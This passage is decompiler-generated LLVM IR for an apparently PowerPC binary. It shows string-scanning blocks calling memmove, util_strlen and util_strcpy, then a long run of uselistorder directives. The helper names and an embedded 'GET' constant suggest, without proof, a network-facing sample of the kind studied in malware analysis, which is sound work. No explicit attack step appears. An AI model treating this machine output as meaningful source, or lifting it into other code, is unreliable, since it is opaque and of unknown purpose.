dec_label_pc_1000238c:                            ; preds = %dec_label_pc_10002378
  store i32 8, i32* %r4.global-to-local, align 4
  store i32 8, i32* %stack_var_-20888, align 4
  br label %dec_label_pc_10002394

dec_label_pc_10002394:                            ; preds = %dec_label_pc_10002378, %dec_label_pc_1000238c
  %v3_10002394 = phi i32 [ 7, %dec_label_pc_10002378 ], [ 8, %dec_label_pc_1000238c ]
  store i32 %v0_10002380, i32* %r3.global-to-local, align 4
  %v1_1000239c = sub nsw i32 1, %v3_10002394
  %v2_100023a0 = add i32 %v3_10002394, %v0_10002380
  store i32 %v2_100023a0, i32* %r4.global-to-local, align 4
  %v1_100023a4 = load i32, i32* %r27.global-to-local, align 4
  %v2_100023a4 = add i32 %v1_100023a4, %v1_1000239c
  store i32 268444588, i32* @lr, align 4
  %v3_100023a8 = call i32 @memmove(i32 %v0_10002380, i32 %v2_100023a0, i32 %v2_100023a4)
  store i32 %v3_100023a8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %stack_var_-20888, align 4
  %v0_100023b4 = load i32, i32* @r28, align 4
  %v1_100023b4 = load i32, i32* %r29.global-to-local, align 4
  %v2_100023b4 = add i32 %v1_100023b4, %v0_100023b4
  %v3_100023b4 = inttoptr i32 %v2_100023b4 to i8*
  %v4_100023b4 = load i8, i8* %v3_100023b4, align 1
  %v5_100023b4 = zext i8 %v4_100023b4 to i32
  store i32 %v5_100023b4, i32* %r3.global-to-local, align 4
  %v3_100023b8 = icmp eq i8 %v4_100023b4, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100023b8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100023b8, label %dec_label_pc_100022e4, label %dec_label_pc_100023c0

dec_label_pc_100023c0:                            ; preds = %dec_label_pc_10002394
  %v1_100023c0 = icmp ult i8 %v4_100023b4, 47
  %v3_100023c0 = icmp eq i8 %v4_100023b4, 47
  store i1 %v1_100023c0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100023c0, i1* %cr7_eq.global-to-local, align 1
  %v0_100023c4 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_100023c4, i32* %r11.global-to-local, align 4
  br i1 %v3_100023c0, label %dec_label_pc_100022dc, label %dec_label_pc_100023cc

dec_label_pc_100023cc:                            ; preds = %dec_label_pc_100023c0
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100023dc

dec_label_pc_100023d4:                            ; preds = %dec_label_pc_100023dc
  %v1_100023d4 = icmp ult i8 %v4_100023e8, 47
  %v3_100023d4 = icmp eq i8 %v4_100023e8, 47
  store i1 %v1_100023d4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100023d4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100023d4, label %dec_label_pc_100022dc, label %dec_label_pc_100023dc

dec_label_pc_100023dc:                            ; preds = %dec_label_pc_100023d4, %dec_label_pc_100023cc
  %v0_100023dc = phi i32 [ %v1_100023dc, %dec_label_pc_100023d4 ], [ 0, %dec_label_pc_100023cc ]
  %v1_100023dc = add i32 %v0_100023dc, 1
  store i32 %v1_100023dc, i32* %r9.global-to-local, align 4
  store i32 %v1_100023dc, i32* %stack_var_-20888, align 4
  %v2_100023e4 = add i32 %v1_100023dc, %v0_100023c4
  store i32 %v2_100023e4, i32* %r11.global-to-local, align 4
  %v3_100023e8 = inttoptr i32 %v2_100023e4 to i8*
  %v4_100023e8 = load i8, i8* %v3_100023e8, align 1
  %v5_100023e8 = zext i8 %v4_100023e8 to i32
  store i32 %v5_100023e8, i32* %r0.global-to-local, align 4
  %v3_100023ec = icmp eq i8 %v4_100023e8, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100023ec, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100023ec, label %dec_label_pc_100022e4, label %dec_label_pc_100023d4

dec_label_pc_100023f8:                            ; preds = %dec_label_pc_10001f50
  %v1_100023f8 = add i32 %v0_100023f8, 1
  store i32 %v1_100023f8, i32* %r4.global-to-local, align 4
  %v2_100023fc = add i32 %v0_10001f50, %v1_100023f8
  store i32 %v2_100023fc, i32* %r29.global-to-local, align 4
  store i32 %v1_100023f8, i32* %stack_var_-20888, align 4
  store i32 %v2_100023fc, i32* %r3.global-to-local, align 4
  store i32 268444684, i32* @lr, align 4
  %v1_10002408 = inttoptr i32 %v2_100023fc to i8*
  %v2_10002408 = call i32 @util_strlen(i8* %v1_10002408)
  store i32 %v2_10002408, i32* %r3.global-to-local, align 4
  %v0_1000240c = load i32, i32* %r29.global-to-local, align 4
  %v2_1000240c = add i32 %v0_1000240c, %v2_10002408
  store i32 %v2_1000240c, i32* %r29.global-to-local, align 4
  %v1_10002410 = add i32 %v2_1000240c, -1
  %v2_10002410 = inttoptr i32 %v1_10002410 to i8*
  %v3_10002410 = load i8, i8* %v2_10002410, align 1
  %v4_10002410 = zext i8 %v3_10002410 to i32
  store i32 %v4_10002410, i32* %r0.global-to-local, align 4
  %v1_10002414 = icmp ult i8 %v3_10002410, 34
  %v3_10002414 = icmp eq i8 %v3_10002410, 34
  store i1 %v1_10002414, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10002414, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10002414, label %dec_label_pc_1000241c, label %dec_label_pc_10001f5c

dec_label_pc_1000241c:                            ; preds = %dec_label_pc_100023f8
  %v3_1000241c = load i32, i32* %stack_var_-20888, align 4
  %v0_10002420 = load i32, i32* @r28, align 4
  %v2_10002420 = add i32 %v0_10002420, %v3_1000241c
  store i32 %v2_10002420, i32* %r29.global-to-local, align 4
  store i32 %v2_10002420, i32* %r3.global-to-local, align 4
  store i32 268444716, i32* @lr, align 4
  %v1_10002428 = inttoptr i32 %v2_10002420 to i8*
  %v2_10002428 = call i32 @util_strlen(i8* %v1_10002428)
  store i32 %v2_10002428, i32* %r3.global-to-local, align 4
  %v0_1000242c = load i32, i32* %r29.global-to-local, align 4
  %v2_1000242c = add i32 %v0_1000242c, %v2_10002428
  store i32 %v2_1000242c, i32* %r29.global-to-local, align 4
  %v0_10002430 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002430 = trunc i32 %v0_10002430 to i8
  %v3_10002430 = add i32 %v2_1000242c, -1
  %v4_10002430 = inttoptr i32 %v3_10002430 to i8*
  store i8 %v1_10002430, i8* %v4_10002430, align 1
  br label %dec_label_pc_10001f5c

dec_label_pc_10002460:                            ; preds = %dec_label_pc_10000d94
  %v0_10002460 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_10002460, i32* @r3, align 4
  %v0_10002464 = load i32, i32* %r28.global-to-local, align 4
  %v1_10002464 = add i32 %v0_10002464, 1
  store i32 %v1_10002464, i32* %r28.global-to-local, align 4
  %v0_10002468 = load i32, i32* @r27, align 4
  store i32 %v0_10002468, i32* %r4.global-to-local, align 4
  %v0_1000246c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000246c = add i32 %v0_1000246c, 3140
  store i32 %v1_1000246c, i32* %r31.global-to-local, align 4
  %v2_10002470 = inttoptr i32 %v0_10002460 to i8*
  %v3_10002470 = call i32 @util_strcpy(i8* %v2_10002470, i32 %v0_10002468)
  store i32 %v3_10002470, i32* %r3.global-to-local, align 4
  %v0_10002474 = load i32, i32* %r28.global-to-local, align 4
  %v1_10002474 = load i32, i32* @r24, align 4
  %v2_10002474 = icmp slt i32 %v0_10002474, %v1_10002474
  %v4_10002474 = icmp eq i32 %v0_10002474, %v1_10002474
  store i1 %v2_10002474, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10002474, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10002474, label %dec_label_pc_10000dcc, label %dec_label_pc_10002460.dec_label_pc_10000ce4_crit_edge

dec_label_pc_10002460.dec_label_pc_10000ce4_crit_edge: ; preds = %dec_label_pc_10002460
  %v2_10000cf0.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10000ce4

; uselistorder directives
  uselistorder i32 %v0_10002474, { 1, 2, 0 }
  uselistorder i32 %v1_100023f8, { 1, 0, 2 }
  uselistorder i8 %v4_100023e8, { 2, 3, 1, 0 }
  uselistorder i32 %v2_100023e4, { 1, 2, 0 }
  uselistorder i32 %v1_100023dc, { 0, 2, 3, 1 }
  uselistorder i1 %v3_100023d4, { 1, 0 }
  uselistorder i32 %v0_100023c4, { 0, 2, 1 }
  uselistorder i1 %v3_100023c0, { 1, 0 }
  uselistorder i32 %v0_10002380, { 2, 0, 1, 3 }
  uselistorder i32 %v1_1000236c, { 1, 2, 0 }
  uselistorder i32 %v2_10002340, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1000231c, { 2, 1, 0, 3 }
  uselistorder i32 %v2_100022f8, { 2, 1, 0, 3 }
  uselistorder i32 %v2_100022e8, { 0, 2, 1, 3 }
  uselistorder i32 %v2_10002208, { 2, 1, 0, 3 }
  uselistorder i32 %v4_100021dc, { 1, 0, 2 }
  uselistorder i32 %v2_100021a8, { 0, 2, 1, 3 }
  uselistorder i32 %v2_10002184, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10002160, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10002150, { 0, 2, 1, 3 }
  uselistorder i8 %v4_10002140, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10002134, { 0, 2, 3, 1 }
  uselistorder i1 %v3_1000212c, { 1, 0 }
  uselistorder i32 %v0_1000211c, { 1, 0, 2 }
  uselistorder i1 %v3_10002118, { 1, 0 }
  uselistorder i32 %v0_100020e8, { 2, 0, 1, 3 }
  uselistorder i32 %v3_100020b4, { 1, 0, 2 }
  uselistorder i32 %v2_10002098, { 1, 0, 2 }
  uselistorder i32 %v4_1000208c, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10002018, { 1, 0, 2 }
  uselistorder i32 %v5_10001fb4, { 1, 0, 2 }
  uselistorder i32 %v0_10001f88, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10001f68, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10001f50, { 1, 0 }
  uselistorder i32 %v0_100023f8, { 1, 0 }
  uselistorder i32 %v3_100022c8, { 2, 1, 0 }
  uselistorder i32 %v5_10001f14, { 1, 0, 2 }
  uselistorder i32 %v1_10001ee4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10001ec4, { 3, 1, 2, 0 }
  uselistorder i32 %v1_10001eb4, { 1, 0 }
  uselistorder i32 %v0_10001eac, { 0, 3, 2, 1 }
  uselistorder i32 %v1_10001e9c, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10001e90, { 1, 0, 2 }
  uselistorder i32 %v4_10001e5c, { 0, 1, 4, 3, 2, 5, 7, 6, 8 }
  uselistorder i32 %v3_10001e48, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10001e08, { 1, 0, 2 }
  uselistorder i32 %v2_10001dc8, { 1, 0, 2 }
  uselistorder i32 %v2_10001d94, { 1, 0, 2 }
  uselistorder i32 %v4_10001d80, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10001d38, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10001d24, { 0, 2, 1, 3 }
  uselistorder i32 %v2_10001cd0, { 2, 1, 0, 3 }
  uselistorder i32 %v0_10001ccc, { 1, 0 }
  uselistorder i32 %v1_10001cc0, { 0, 2, 1 }
  uselistorder i32 %v4_10001cb0, { 1, 0, 2 }
  uselistorder i32 %v0_10001ca0, { 1, 0 }
  uselistorder i32 %v1_10001c8c, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32 %v3_10001c88, { 2, 1, 0, 3 }
  uselistorder i32 %v3_10001c6c, { 2, 1, 0, 3 }
  uselistorder i32 %v5_10001c48, { 1, 0, 2 }
  uselistorder i32 %v0_10001c30, { 1, 0 }
  uselistorder i32 %v4_10001c08, { 0, 1, 4, 3, 2, 6, 5, 7 }
  uselistorder i32 %v3_10001bf4, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10001bb4, { 1, 0, 2 }
  uselistorder i32 %v4_10001b90, { 1, 0, 2 }
  uselistorder i1 %v3_10001b40, { 0, 2, 1 }
  uselistorder i32 %v0_10001b3c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10001b58, { 0, 1, 5, 4, 3, 6, 2 }
  uselistorder i32 %v2_10001b54, { 2, 1, 0, 3 }
  uselistorder i32 %v0_10001b50, { 1, 0 }
  uselistorder i32 %v4_10001af8, { 0, 2, 1, 3 }
  uselistorder i32 %v4_10001ac4, { 2, 0, 4, 3, 1, 6, 5, 7 }
  uselistorder i32 %v1_10001aac, { 1, 0 }
  uselistorder i32 %v1_10001a94, { 0, 2, 1 }
  uselistorder i32 %v4_10001a90, { 2, 1, 0, 3 }
  uselistorder i32 %v3_10001a6c, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10001a60, { 1, 0, 2 }
  uselistorder i32 %v4_10001a08, { 0, 1, 4, 3, 2, 6, 5, 7 }
  uselistorder i32 %v3_100019f4, { 2, 1, 0, 3 }
  uselistorder i32 %v4_100019b4, { 1, 0, 2 }
  uselistorder i32 %v4_10001988, { 1, 0, 2 }
  uselistorder i32 %v4_10001940, { 0, 1, 4, 3, 2, 6, 5, 7 }
  uselistorder i32 %v3_1000192c, { 2, 1, 0, 3 }
  uselistorder i32 %v4_100018ec, { 1, 0, 2 }
  uselistorder i32 %v4_100018b8, { 1, 0, 2 }
  uselistorder i32 %v4_10001870, { 0, 1, 4, 3, 2, 6, 5, 7 }
  uselistorder i32 %v3_1000185c, { 2, 1, 0, 3 }
  uselistorder i32 %v4_1000181c, { 1, 0, 2 }
  uselistorder i32 %v4_100017e8, { 1, 0, 2 }
  uselistorder i32 %v4_100017bc, { 1, 0, 2 }
  uselistorder i32 %v5_1000176c, { 1, 0, 2 }
  uselistorder i32 %v4_1000174c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v4_100016cc, { 1, 0, 2 }
  uselistorder i32 %v4_100016a8, { 1, 0, 2 }
  uselistorder i32 %v4_1000168c, { 1, 0, 2 }
  uselistorder i32 %v3_10001670, { 1, 0, 2 }
  uselistorder i32 %v0_10001670, { 0, 2, 1 }
  uselistorder i32 %v4_10001664, { 1, 0, 2 }
  uselistorder i32 %v4_10001610, { 1, 2, 0 }
  uselistorder i32 %v0_100015d8, { 1, 0 }
  uselistorder i32 %v0_100015e0, { 1, 0 }
  uselistorder i32 %v3_100015cc, { 1, 0, 2 }
  uselistorder i32 %v3_100015a8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10001590, { 1, 2, 0 }
  uselistorder i32 %v0_10001584.pr, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10001574, { 0, 2, 1, 3 }
  uselistorder i32 %v3_1000167c, { 0, 2, 1 }
  uselistorder i32 %v3_10001564, { 1, 0, 2 }
  uselistorder i32 %v3_10001528, { 1, 0, 2, 3, 5, 4, 6 }
  uselistorder i32 %v0_10001510, { 1, 0 }
  uselistorder i32 %v3_100014d0, { 1, 0, 2 }
  uselistorder i32 %v2_100014b4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_100014a8, { 1, 0 }
  uselistorder i32 %v2_1000147c, { 1, 0, 4, 3, 2, 5, 6 }
  uselistorder i32 %v1_10001474, { 1, 0 }
  uselistorder i32 %v2_1000143c, { 1, 0, 3, 4, 2, 5 }
  uselistorder i32 %v3_10001410, { 1, 0, 2 }
  uselistorder i32 %v1_100013b4, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v3_100013b0, { 2, 1, 0, 3 }
  uselistorder i32 %v3_10001360, { 0, 2, 1, 3 }
  uselistorder i32 %v3_1000133c, { 0, 2, 1, 3 }
  uselistorder i32 %v3_100010b4, { 1, 0, 2 }
  uselistorder i32 %v1_100010a8, { 1, 0 }
  uselistorder i32 %v2_100010a0, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10001068, { 2, 1, 0 }
  uselistorder i32 %v4_10001064, { 1, 0 }
  uselistorder i32 %v3_10001060, { 2, 1, 0 }
  uselistorder i32 %v1_10001058, { 1, 0, 2 }
  uselistorder i32 %v2_10001048, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_10001038, { 1, 0, 2 }
  uselistorder i1 %v3_10001030, { 1, 0 }
  uselistorder i1 %v3_10001028, { 1, 0 }
  uselistorder i32 %v1_10001014, { 1, 0 }
  uselistorder i32 %v12_10001010, { 1, 0 }
  uselistorder i32 %v4_10001010, { 1, 0 }
  uselistorder i32 %v3_1000100c, { 2, 1, 0 }
  uselistorder i32 %v1_10001010, { 1, 0 }
  uselistorder i32 %v0_10000fd8, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10000fac, { 1, 0 }
  uselistorder i32 %v1_10000fa8, { 1, 0, 2 }
  uselistorder i32 %v2_10000f78, { 1, 0, 4, 3, 2, 5, 6 }
  uselistorder i32 %v3_10000ef4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_10000ec4, { 1, 0, 2 }
  uselistorder i8 %v3_10000eb0, { 9, 10, 11, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_10000eb0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_100014c4, { 5, 6, 2, 3, 0, 1, 7, 4 }
  uselistorder i32 %v1_10000ea0, { 1, 0, 2 }
  uselistorder i1 %v3_10000e80, { 1, 0 }
  uselistorder i1 %v3_10000e78, { 1, 0 }
  uselistorder i1 %v3_10000e70, { 1, 0 }
  uselistorder i1 %v3_10000e68, { 1, 0 }
  uselistorder i1 %v3_10000e60, { 1, 0 }
  uselistorder i32 %v1_10000e44, { 1, 0 }
  uselistorder i32 %v1_10000e40, { 1, 0 }
  uselistorder i32 %v1_10000e24, { 1, 0 }
  uselistorder i32 %v1_10000e20, { 1, 0 }
  uselistorder i32 %v3_10001aec, { 1, 2, 0 }
  uselistorder i8* %v3_100017bc, { 4, 5, 3, 6, 7, 2, 8, 1, 9, 0, 10, 11, 12 }
  uselistorder i8* %v1_100010fc, { 11, 10, 12, 8, 6, 7, 9, 0, 1, 2, 3, 4, 5, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 %v2_10000df4, { 0, 12, 13, 11, 14, 9, 7, 8, 10, 1, 2, 3, 4, 5, 6, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32 %v1_10000db0, { 1, 0 }
  uselistorder i32 %v3_10000da4, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_10000d94, { 0, 2, 1 }
  uselistorder i32 %v2_10000cc0, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32 %v0_10000c50., { 1, 2, 0 }
  uselistorder i32 %v1_10000c28, { 1, 2, 3, 0 }
  uselistorder i32 %v3_10000c14, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v2_10000c10, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10000bf8, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10000be8, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10000b78, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10000b6c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10000a9c, { 9, 8, 11, 10, 7, 12, 0, 2, 6, 13, 14, 15, 5, 16, 4, 17, 3, 18, 19, 20, 22, 21, 1, 23, 25, 24, 26, 28, 27, 29 }
  uselistorder i32* %stack_var_-20888, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 13, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 0, 34, 35, 36, 37, 38, 41, 39, 40, 1 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 51, 52, 49, 50, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68 }
  uselistorder i32* %r4.global-to-local, { 2, 3, 6, 5, 7, 8, 9, 10, 4, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 52, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 72, 71, 73, 74, 75, 76, 78, 77, 79, 80, 81, 139, 140, 142, 141, 143, 144, 145, 146, 147, 149, 148, 151, 150, 153, 152, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 126, 125, 127, 128, 129, 130, 131, 0, 132, 133, 135, 134, 137, 136, 138, 1 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 57, 22, 14, 18, 2, 3, 4, 19, 15, 16, 17, 8, 9, 11, 5, 6, 7, 32, 10, 12, 13, 20, 21, 23, 24, 25, 26, 51, 27, 28, 29, 30, 31, 37, 33, 34, 35, 36, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 70, 71, 73, 74, 72, 75, 50, 52, 53, 54, 55, 58, 61, 59, 56, 60, 62, 63, 64, 65, 66, 68, 67, 69 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 11, 12, 13, 14, 15, 16, 17, 18, 6, 7, 8, 9, 10, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 58, 59, 57, 303, 302, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 296, 297, 298, 299, 300, 301, 295, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 152, 151, 153, 154, 155, 156, 157, 158, 159, 161, 160, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 177, 176, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 210, 209, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 224, 223, 226, 225, 227, 228, 229, 230, 231, 232, 234, 233, 235, 236, 237, 238, 239, 240, 243, 241, 242, 244, 245, 246, 247, 248, 249, 250, 251, 0 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 3, 4, 5, 22, 6, 7, 8, 9, 10, 11, 12, 96, 19, 13, 14, 30, 31, 32, 34, 33, 35, 15, 16, 17, 18, 20, 21, 23, 24, 25, 26, 27, 28, 36, 29, 43, 42, 37, 38, 39, 40, 44, 41, 45, 46, 47, 48, 49, 50, 51, 84, 85, 86, 87, 88, 89, 72, 92, 90, 93, 94, 95, 97, 91, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 70, 69, 71, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83 }
  uselistorder i32* %r28.global-to-local, { 0, 1, 20, 2, 4, 5, 6, 7, 11, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 30, 31, 32, 33, 34, 35, 38, 36, 37, 3, 21, 22, 23, 25, 26, 24, 28, 27, 29 }
  uselistorder i32* %r27.global-to-local, { 4, 1, 0, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r26.global-to-local, { 0, 1, 2, 10, 4, 3, 7, 5, 6, 8, 11, 12, 9, 13, 14, 18, 15, 19, 16, 20, 17, 21, 22 }
  uselistorder i32* %r25.global-to-local, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32* %r23.global-to-local, { 27, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 29, 30 }
  uselistorder i32* %r21.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 15, 16, 17, 11, 12, 0, 13, 14, 18, 19 }
  uselistorder i32* %r16.global-to-local, { 0, 1, 2, 3, 12, 13, 14, 15, 4, 5, 6, 7, 8, 9, 10, 11, 16 }
  uselistorder i32* %r14.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 13, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 4, 2, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 61, 63, 64, 67, 65, 66, 68, 69, 70, 71, 72, 73, 74, 75, 78, 76, 77, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 3, 2, 4, 7, 8, 9, 10, 5, 6, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 133, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 47, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 132, 124, 125, 126, 127, 128, 129, 130, 131, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 85, 84, 81, 82, 83, 86, 87, 88, 89, 90, 91, 98, 99, 92, 93, 94, 95, 96, 97, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 3, 2, 4, 7, 8, 9, 10, 5, 6, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 133, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 47, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 134, 124, 125, 126, 127, 128, 129, 130, 131, 132, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 85, 84, 81, 82, 83, 86, 87, 88, 89, 90, 91, 98, 99, 92, 93, 94, 95, 96, 97, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_100100f0.21 to i32), { 1, 0 }
  uselistorder i32 10240, { 0, 2, 1, 3, 4 }
  uselistorder i32 2112, { 0, 1, 2, 3, 5, 6, 7, 8, 9, 4, 10, 11, 12, 13, 14 }
  uselistorder i8 7, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 2, { 1, 0 }
  uselistorder i32 1195725824, { 1, 0, 2 }
  uselistorder i32 3140, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 51, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 50, { 0, 2, 1, 3 }
  uselistorder i32 49, { 0, 2, 1, 3 }
  uselistorder i32 43, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_100100cc.16 to i32), { 1, 2, 0 }
  uselistorder i32 %arg4, { 0, 2, 1 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10002394, { 1, 0 }
  uselistorder label %dec_label_pc_10002310, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10002178, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000214c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100020f4, { 1, 0 }
  uselistorder label %dec_label_pc_100020cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10001fcc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10001f7c, { 1, 0 }
